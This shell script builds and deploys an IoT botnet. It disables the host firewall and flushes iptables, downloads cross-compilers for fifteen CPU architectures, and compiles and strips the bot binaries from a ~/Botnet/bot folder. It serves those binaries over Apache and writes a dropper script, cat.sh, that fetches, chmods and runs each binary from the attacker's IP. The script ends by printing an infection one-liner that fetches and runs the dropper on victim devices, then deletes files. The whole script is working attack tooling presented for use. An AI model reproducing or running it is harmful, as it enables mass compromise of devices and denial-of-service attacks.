ufw disable
cd bot

sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -P FORWARD ACCEPT

service apache2 start
#INSTALL MEGA FOR CSKY CC
wget https://mega.nz/linux/repo/xUbuntu_20.04/amd64/megacmd-xUbuntu_20.04_amd64.deb
sudo apt install ./megacmd-xUbuntu_20.04_amd64.deb

mkdir -p /etc/xcompile
cd /etc/xcompile

# download compilers (replaced ubuntu's legacy ones with these i found)
mega-get 'https://mega.nz/file/LgBRXSRQ#OReuzxJlfJxXCsbbVbjm9-sizcAiIZSkZDy-Y7n59q8' # FOR cross-compiler-csky.tar.gz|folderOutput=csky-gcc
wget https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-powerpc.tar.gz
wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-sh4.tar.gz
wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-mips.tar.gz
wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-mipsel.tar.gz
wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-x86_64.tar.gz
wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-m68k.tar.gz
wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-sparc.tar.gz
wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-i486.tar.gz
wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-armv4l.tar.gz
wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-armv5l.tar.gz
wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-armv6l.tar.gz
wget https://github.com/R00tS3c/DDOS-RootSec/blob/master/uclib-cross-compilers/cross-compiler-armv7l.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/blob/master/uclib-cross-compilers/cross-compiler-armv7l.tar.bz2 -O cross-compiler-armv7l.tar.bz2
wget https://toolchains.bootlin.com/downloads/releases/toolchains/aarch64/tarballs/aarch64--uclibc--stable-2024.05-1.tar.xz -O aarch64-toolchain.tar.xz
wget https://occ-oss-prod.oss-cn-hangzhou.aliyuncs.com/resource/1356021/1619527806432/csky-linux-uclibc-tools-x86_64-uclibc-linux-4.9.56-20210423.tar.gz -O cross-compiler-csky.tar.gz

# extract compilers
# ARC
mkdir arc
cd arc
tar -xf ../arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install/* .
rmdir arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install
cd ..
# POWERPC
mkdir powerpc
cd powerpc
tar -xf ../cross-compiler-powerpc.tar.gz
mv cross-compiler-powerpc/* .
rmdir cross-compiler-powerpc
cd ..
# SH4
mkdir sh4
cd sh4
tar -xf ../cross-compiler-sh4.tar.gz
mv cross-compiler-sh4/* .
rmdir cross-compiler-sh4
cd ..
# MIPS
mkdir mips
cd mips
tar -xf ../cross-compiler-mips.tar.gz
mv cross-compiler-mips/* .
rmdir cross-compiler-mips
cd ..
# MIPSEL
mkdir mipsel
cd mipsel
tar -xf ../cross-compiler-mipsel.tar.gz
mv cross-compiler-mipsel/* .
rmdir cross-compiler-mipsel
cd ..
# X86_64
mkdir x86_64
cd x86_64
tar -xf ../cross-compiler-x86_64.tar.gz
mv cross-compiler-x86_64/* .
rmdir cross-compiler-x86_64
cd ..
# M68K
mkdir m68k
cd m68k
tar -xf ../cross-compiler-m68k.tar.gz
mv cross-compiler-m68k/* .
rmdir cross-compiler-m68k
cd ..
# SPARC
mkdir sparc
cd sparc
tar -xf ../cross-compiler-sparc.tar.gz
mv cross-compiler-sparc/* .
rmdir cross-compiler-sparc
cd ..
# I486
mkdir i486
cd i486
tar -xf ../cross-compiler-i486.tar.gz
mv cross-compiler-i486/* .
rmdir cross-compiler-i486
cd ..
# AARCH64
mkdir aarch64
cd aarch64
xz -d aarch64-toolchain.tar.xz
tar -xf aarch64-toolchain.tar
rm aarch64-toolchain.tar
# move contents up if extracted to a single subdir
# since no raw aarch64 cc was found 
aarch64_dir=$(find . -maxdepth 1 -type d ! -name . | head -n 1)
if [ -n "$aarch64_dir" ]; then
  mv "$aarch64_dir"/* .
  rmdir "$aarch64_dir"
fi
cd ..
# ARMV4L
mkdir armv4l
cd armv4l
tar -xf ../cross-compiler-armv4l.tar.gz
mv cross-compiler-armv4l/* .
rmdir cross-compiler-armv4l
cd ..
# ARMV5L
mkdir armv5l
cd armv5l
tar -xf ../cross-compiler-armv5l.tar.gz
mv cross-compiler-armv5l/* .
rmdir cross-compiler-armv5l
cd ..
# ARMV6L
mkdir armv6l
cd armv6l
tar -xf ../cross-compiler-armv6l.tar.gz
mv cross-compiler-armv6l/* .
rmdir cross-compiler-armv6l
cd ..
# ARMV7L
mkdir armv7l
cd armv7l
tar -xjf cross-compiler-armv7l.tar.bz2
mv cross-compiler-armv7l/* .
rmdir cross-compiler-armv7l
rm cross-compiler-armv7l.tar.bz2
cd ..
# CSKY GCC
mkdir csky-gcc
cd csky-gcc
tar -xf ../cross-compiler-csky.tar.gz
mv csky-gcc/* .
rmdir csky-gcc
rm cross-compiler-csky.tar.gz
cd ..

# Export PATH for each compiler
export PATH=/etc/xcompile/arc/bin:$PATH
export PATH=/etc/xcompile/powerpc/bin:$PATH
export PATH=/etc/xcompile/sh4/bin:$PATH
export PATH=/etc/xcompile/mips/bin:$PATH
export PATH=/etc/xcompile/mipsel/bin:$PATH
export PATH=/etc/xcompile/x86_64/bin:$PATH
export PATH=/etc/xcompile/m68k/bin:$PATH
export PATH=/etc/xcompile/sparc/bin:$PATH
export PATH=/etc/xcompile/i486/bin:$PATH
export PATH=/etc/xcompile/aarch64/bin:$PATH
export PATH=/etc/xcompile/armv4l/bin:$PATH
export PATH=/etc/xcompile/armv5l/bin:$PATH
export PATH=/etc/xcompile/armv6l/bin:$PATH
export PATH=/etc/xcompile/armv7l/bin:$PATH
export PATH=/etc/xcompile/csky-gcc/bin:$PATH
echo 'export PATH=/etc/xcompile/arc/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/powerpc/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/sh4/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/mips/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/mipsel/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/x86_64/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/m68k/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/sparc/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/i486/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/aarch64/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/armv4l/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/armv5l/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/armv6l/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/armv7l/bin:$PATH' >> ~/.bashrc
echo 'export PATH=/etc/xcompile/csky-gcc/bin:$PATH' >> ~/.bashrc
source ~/.bashrc

rm -rf *.tar.gz *.tar.xz
cd ~/Botnet/bot

# Build for each arch
powerpc-gcc *.c -o powerpc -DARCH_powerpc -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
mips-gcc *.c -o mips -DARCH_mips -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
mipsel-gcc *.c -o mipsel -DARCH_mipsel -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
x86_64-gcc *.c -o x86_64 -DARCH_x86_64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
m68k-gcc *.c -o m68k -DARCH_m68k -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
sparc-gcc *.c -o sparc -DARCH_sparc -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
i486-gcc *.c -o i486 -DARCH_i486 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
aarch64-linux-gcc *.c -o aarch64 -DARCH_aarch64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
armv4l-gcc *.c -o armv4l -DARCH_armv4l -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
armv5l-gcc *.c -o armv5l -DARCH_armv5l -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
armv6l-gcc *.c -o armv6l -DARCH_armv6l -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
armv7l-gcc *.c -o armv7l -DARCH_armv7l -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
sh4-gcc *.c -o sh4 -DARCH_sh4 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
arc-linux-gcc *.c -o arc -DARCH_arc -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
csky-linux-gcc *.c -o csky -DARCH_csky -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99

# strip bins
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr powerpc
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr mipsel
x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr x86_64
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr m68k
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr sparc
i486-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr i486
aarch64-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr aarch64
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr armv4l
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr armv5l
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr armv6l
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr armv7l
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr sh4
arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr arc
csky-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr csky

# Move binaries to web dir
mv powerpc mips mipsel x86_64 m68k sparc i486 aarch64 armv4l armv5l armv6l sh4 arc csky /var/www/html 2>/dev/null

cd ..

IP=$(curl -s ifconfig.me)
cat <<EOF >/var/www/html/cat.sh
#!/bin/bash
wget http://$IP/x86_64 -O x86_64 || curl http://$IP/x86_64 -o x86_64; chmod 777 x86_64; ./x86_64; rm -rf x86_64
wget http://$IP/aarch64 -O aarch64 || curl http://$IP/aarch64 -o aarch64; chmod 777 aarch64; ./aarch64; rm -rf aarch64
wget http://$IP/m68k -O m68k || curl http://$IP/m68k -o m68k; chmod 777 m68k; ./m68k; rm -rf m68k
wget http://$IP/mips -O mips || curl http://$IP/mips -o mips; chmod 777 mips; ./mips; rm -rf mips
wget http://$IP/mipsel -O mipsel || curl http://$IP/mipsel -o mipsel; chmod 777 mipsel; ./mipsel; rm -rf mipsel
wget http://$IP/powerpc -O powerpc || curl http://$IP/powerpc -o powerpc; chmod 777 powerpc; ./powerpc; rm -rf powerpc
wget http://$IP/sparc -O sparc || curl http://$IP/sparc -o sparc; chmod 777 sparc; ./sparc; rm -rf sparc
wget http://$IP/sh4 -O sh4 || curl http://$IP/sh4 -o sh4; chmod 777 sh4; ./sh4; rm -rf sh4
wget http://$IP/arc -O arc || curl http://$IP/arc -o arc; chmod 777 arc; ./arc; rm -rf arc
wget http://$IP/csky -O csky || curl http://$IP/csky -o csky; chmod 777 csky; ./csky; rm -rf csky
wget http://$IP/i486 -O i486 || curl http://$IP/i486 -o i486; chmod 777 i486; ./i486; rm -rf i486
wget http://$IP/armv4l -O armv4l || curl http://$IP/armv4l -o armv4l; chmod 777 armv4l; ./armv4l; rm -rf armv4l
wget http://$IP/armv5l -O armv5l || curl http://$IP/armv5l -o armv5l; chmod 777 armv5l; ./armv5l; rm -rf armv5l
wget http://$IP/armv6l -O armv6l || curl http://$IP/armv6l -o armv6l; chmod 777 armv6l; ./armv6l; rm -rf armv6l
wget http://$IP/armv7l -O armv7l || curl http://$IP/armv7l -o armv7l; chmod 777 armv7l; ./armv7l; rm -rf armv7l
/var/wii 2>/dev/null &
EOF

echo "payload: cd /tmp || cd /var/run || cd /mnt || cd /root; wget http://$IP/cat.sh; curl -O http://$IP/cat.sh; chmod 777 cat.sh; sh cat.sh; sh cat1.sh; rm -rf *"

exit 0
